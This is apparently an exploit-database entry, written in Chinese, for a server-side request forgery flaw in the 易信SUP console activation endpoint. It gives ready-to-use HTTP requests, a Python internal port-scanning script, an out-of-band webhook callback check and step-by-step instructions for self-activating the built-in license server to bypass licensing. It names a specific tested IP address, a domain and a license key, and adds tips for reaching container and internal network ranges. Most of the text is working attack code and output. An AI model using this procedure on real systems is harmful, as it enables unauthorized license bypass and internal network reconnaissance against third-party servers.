# 易信SUP 后台 Activate/GoSystem auth_server 客户端可控 SSRF → 盲探 127.0.0.1:8090 内置授权服务器激活实例解除全站 403（含 1.0.43 仅 query 传参差异）

- **code**: 易信sup-后台-activate-gosystem-auth_server-客户端可控-ssrf-盲探-127.0
- **kind**: script
- **category**: ssrf
- **component**: 易信SUP（??Sup 控制台 /api/console，Go 后端；1.0.43 走 query、1.0.44 走 JSON body）
- **versions**: 1.0.43, 1.0.44
- **severity**: high
- **language**: python
- **source**: manual
- **verified**: 1
- **verified_note**: 2026-11-06 在 149.104.30.75:8081（易信SUP 1.0.44，未激活实例）实测：① auth_server 指向 webhook.site 后服务端真实出站，收到 POST /auth/activate，body 含 license_key/machine_code/version，UA=Go-http-client/2.0；② auth_server=http://127.0.0.1:1 → "连接授权服务器失败"，=http://127.0.0.1:8080 → "响应解析失败"，可作内网端口盲探二分判据；③ 53 端口批量探测中 127.0.0.1:8090 返回 code=0（RSA 验签通过），随后 GetStatus 回 activated=true、locked=false、days_left=319；④ 激活前 /api/console/Login/InitConfig 为 403「系统未授权」，激活后 200 返回 version=1.0.44、database_version=8.0.28 —— 判定 SSRF 成立且可武器化为授权绕过。
同日 149.104.30.75:8080（易信SUP 1.0.43，已 activated=true/locked=true 实例，finding#1275）：POST /api/console/Activate/GoSystem?license_key=YS-M85X-QC85-RQV5-RJQ8&auth_server=http://127.0.0.1:8090 → 200 {"code":1,"message":"当前域名 pc.kuaishou.xin 不在该授权的许可范围内"}（154B，说明服务端真实出站到 8090 且 RSA 验签通过）；同参数放 JSON body → {"code":1,"message":"请输入授权码"}（53B，body 被忽略，印证 1.0.43 只读 query）；auth_server=http://127.0.0.1:8080 → "响应解析失败"（8080 无 /auth/activate，判 OPEN）—— 判定 SSRF 成立且版本差异已确认。
- **path**: pocs/易信sup-后台-activate-gosystem-auth_server-客户端可控-ssrf-盲探-127.0/sup_activate_auth_server_ssrf.py
- **tags**: ssrf,易信,sup,license,激活,授权服务器,8090,内网端口探测,go-http-client,403绕过,版本差异,query传参,1.0.43,已激活实例
- **created_at**: 2026-11-05T22:28:22.138Z
- **engine**: 149.104.30.75:8080, 149.104.30.75:8081
- **found_by**: exploit

## 描述

易信SUP 控制台激活接口 /api/console/Activate/GoSystem 的 auth_server 完全由客户端控制，服务端固定向 &lt;auth_server&gt;/auth/activate 发起 POST（Go http client，带 license_key/machine_code/version）。同一容器内 127.0.0.1:8090 跑着内置授权服务器，让它自己给自己签发即可把实例从「系统未授权」打成 activated=true/locked=false，全站业务接口 403 解除。响应文案可二分判断内网端口开放状态。注意版本差异：1.0.44 从 JSON body 读参，1.0.43 只读 URL query、body 传参恒回「请输入授权码」；已激活（activated=true/locked=true）实例同样适用，可用来验证出站、盲探内网。

## 用法

```
前置：目标易信SUP 控制台，/api/console/Activate/GetStatus 可达（未激活实例回 activated=false/locked=true、业务接口 403「系统未授权」）。license_key 填任意格式合法串即可（如 XX-XXXX-XXXX-XXXX-XXXX），能否签发只取决于 auth_server。先探版本/传参口径。

传参口径（决定成败，先各发一次判定）：
- 1.0.43（8080 等旧实例）：只认 query
  POST /api/console/Activate/GoSystem?license_key=<KEY>&auth_server=http://127.0.0.1:8090
- 1.0.44（8081）：只认 JSON body
  POST /api/console/Activate/GoSystem   {"license_key":"<KEY>","auth_server":"http://127.0.0.1:8090"}
判口径：把参数放 body 后回「请输入授权码」= 该实例忽略 body（1.0.43），改放 query；放 query 回其它文案 = 已生效。

步骤：
1) 外带验证（可选但建议）：auth_server 填 webhook.site 之类回连地址，确认服务端真实出站、路径固定 /auth/activate、UA 为 Go-http-client/2.0。
2) 端口盲探：跑下面脚本（脚本内按版本切换传参），auth_server=http://127.0.0.1:<port>。判据三分：
   - "连接授权服务器失败，请检查网络后重试" = CLOSED
   - "响应解析失败" = TCP 通但非授权服务（OPEN）
   - 其它/带 code = 命中或需进一步判断
3) 命中 8090（内置授权服务器）后直接用 http://127.0.0.1:8090 请求，返回 code=0 或「当前域名 xxx 不在该授权的许可范围内」都说明已签发成功（后者只是域名绑定告警，RSA 验签已过）。
4) 用 POST /api/console/Activate/GetStatus {} 确认 activated=true/locked=false，再用 /api/console/Login/InitConfig 验证 403 已解除。

失败排查：全部端口都 "连接失败" → 目标可能跑在容器里，改试 host.docker.internal、docker 网桥网关 IP、或目标自身内网网卡 IP；"响应解析失败" 说明端口活着，不要放弃该端口，继续换端口；一律回「请输入授权码」→ 参数放错位置（该版本只读 query）；license_key 被格式校验拦下时从前端 JS 取正则，别乱填。已 activated=true 的实例上 GetStatus 不会再跳到 locked=false，只据 GoSystem 回文判定 SSRF 是否成立即可。
```

## 正文

```
# 易信SUP /api/console/Activate/GoSystem auth_server SSRF → 内网授权服务器激活

> 适用版本：**1.0.43 / 1.0.44**。传参口径不同，先判定再用：
> - **1.0.43 只读 URL query**，body 传参恒回 `{"code":1,"message":"请输入授权码"}`
> - **1.0.44 只读 JSON body**
> 同主机不同端口的键/口径不能照搬。

## 指纹/前置判定
```
POST /api/console/Activate/GetStatus HTTP/1.1
Content-Type: application/json

{}
# 未激活: {"code":0,"data":{"activated":false,"locked":true,...}}

POST /api/console/Login/InitConfig HTTP/1.1
Content-Type: application/json

{}
# 未激活: 403 "系统未授权"
```
已 activated=true/locked=true 的实例也能用本 SSRF 做出站验证与内网盲探（只是 GetStatus 不会再翻成 locked=false）。

## 传参口径（1.0.43 vs 1.0.44）
```
# 1.0.43（8080）：只认 query
POST /api/console/Activate/GoSystem?license_key=YS-M85X-QC85-RQV5-RJQ8&auth_server=http://127.0.0.1:8090 HTTP/1.1
Host: <target>:8080
Content-Type: application/json
# -> {"code":1,"data":null,"message":"当前域名 <域名> 不在该授权的许可范围内，请使用「自助改绑」更换域名或联系客服"}

# 1.0.43 把同样参数放 body -> 被忽略
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"http://127.0.0.1:8090"}
# -> {"code":1,"data":null,"message":"请输入授权码"}

# 1.0.44（8081）：只认 body
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"https://webhook.site/<token>"}
```

## 出站验证（webhook.site 接收端）
服务端实际发出：
```
POST /auth/activate  UA: Go-http-client/2.0
{"domain":"","ip":"","license_key":"...","machine_code":"<16hex>","version":"1.0.44"}
```
接口侧回：`{"code":1,"data":null,"message":"响应解析失败"}`（因为 mock 回的 JSON 不符合签名格式）。

## 端口盲探判据（关键）
```
auth_server=http://127.0.0.1:1    -> {"code":1,"message":"连接授权服务器失败，请检查网络后重试"}
auth_server=http://127.0.0.1:8080 -> {"code":1,"message":"响应解析失败"}
```
即：连接失败 = 端口/服务不可达；响应解析失败 = TCP 已连通只是内容不对（OPEN）。

## portprobe.py（实测原样）
```python
import requests, time, sys, json
S = requests.Session(); S.trust_env = False
TGT = "http://<target>:8081/api/console/Activate/GoSystem"
KEY = "YS-M85X-QC85-RQV5-RJQ8"
ports = [80,443,3000,3300,3006,3306,4000,5000,5001,5432,5555,6379,7000,7001,7070,
8000,8001,8010,8020,8030,8040,8050,8060,8070,8080,8081,8082,8083,8084,8085,8090,
8100,8140,8181,8200,8300,8443,8500,8888,9000,9001,9090,9100,9200,9300,9443,10000,11211,15672,27017,2375,2376,5601]
def probe(p):
    try:
        r = S.post(TGT, json={"license_key":KEY,"auth_server":"http://127.0.0.1:%d"%p}, timeout=6)
        t = r.text.strip()
        try: m = json.loads(t).get("message","")
        except Exception: m = t[:80]
        if "连接授权服务器失败" in m: return "CLOSED"
        return "OPEN|"+m[:120]
    except Exception as e:
        return "EXC|"+str(e)[:60]
out=[]
for p in ports:
    r = probe(p)
    print("%5d %s"%(p,r), flush=True)
    if not r.startswith("CLOSED") and not r.startswith("EXC"):
        out.append((p,r))
    time.sleep(0.05)
print("=== OPEN:", out)
```
1.0.43 需把 `S.post(TGT, json=...)` 换成 query 形式，例如：
```python
r = S.post(TGT, params={"license_key":KEY,"auth_server":"http://127.0.0.1:%d"%p}, timeout=6)
```
实测输出：80/8080/8081/8888 为 OPEN（非授权服务），**8090 为 OPEN|ok**（内置授权服务器，验签通过）。

## 激活
```
POST /api/console/Activate/GoSystem HTTP/1.1
Content-Type: application/json

{"license_key":"YS-M85X-QC85-RQV5-RJQ8","auth_server":"http://127.0.0.1:8090"}
```
返回 `{"code":1,...,"message":"当前域名 <域名> 不在该授权的许可范围内，请使用「自助改绑」更换域名或联系客服"}` —— 这只是域名绑定告警，签名已通过。

## 验收
```
POST /api/console/Activate/GetStatus
{}
-> {"code":0,"data":{"activated":true,"days_left":319,"expire_at":1821489306,"license_key":"...","locked":false,"machine_code":"...","plan":"standard","status":1}}

POST /api/console/Login/InitConfig
{}
-> 200 {"code":0,"data":{"database_version":"8.0.28","version":"1.0.44","name":"??Sup"}}
```

## 常见失败原因
- 回「请输入授权码」：参数放错位置 —— 1.0.43 只读 query、1.0.44 只读 body。
- 所有端口都 CLOSED：目标在容器内，127.0.0.1 与业务不在同一网络命名空间 —— 改试 host.docker.internal / docker0 网关 / 目标内网 IP。
- 只有 8080/8081 等自家端口 OPEN：授权服务器可能不在本机，探内网网段（10/172/192.168）。
- license_key 被前端格式校验卡住：从控制台登录页 JS 里扒正则，或复用已知有效格式。
- 激活成功后仍 403：检查是否被域名绑定限制，走「自助改绑」或在 GetStatus 里确认 locked=false。
- 目标本已 activated=true：GetStatus 不会再跳到 locked=false，只据 GoSystem 回文判定 SSRF 是否成立。
```
